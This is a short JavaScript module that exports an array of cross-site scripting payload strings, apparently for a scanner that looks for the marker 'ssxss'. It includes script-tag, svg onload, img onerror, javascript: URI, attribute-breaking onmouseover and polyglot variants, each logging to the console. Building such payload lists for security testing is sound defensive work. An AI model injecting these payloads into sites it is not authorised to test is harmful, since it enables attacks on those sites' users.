const payloads = [
  "<script>console.log('ssxss');</script>",
  `"/><script>console.log('ssxss');</script>`,
  `=""/><script>console.log('ssxss');</script>`,
  `"><svg onload=console.log('ssxss');>`,
  ';javascript:console.log("ssxss");//',
  "<img src='#' onerror=console.log('ssxss') />",
  '<<SCRIPT>console.log("ssxss");//<</SCRIPT>',
  `$('#div').html('<img alt="<x" title="/><img src=x onerror=console.log("ssxss")>">');`,
  `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+console.log('ssxss')//'>`,
  '<a onmouseover="console.log("ssxss")">ssxss</a>',
  `" onmouseover="console.log('ssxss')"`,
  `"onmouseover="console.log('ssxss')"`,
  `"onmouseover="console.log&#40;'ssxss'&#41;"`
];

module.exports = payloads;
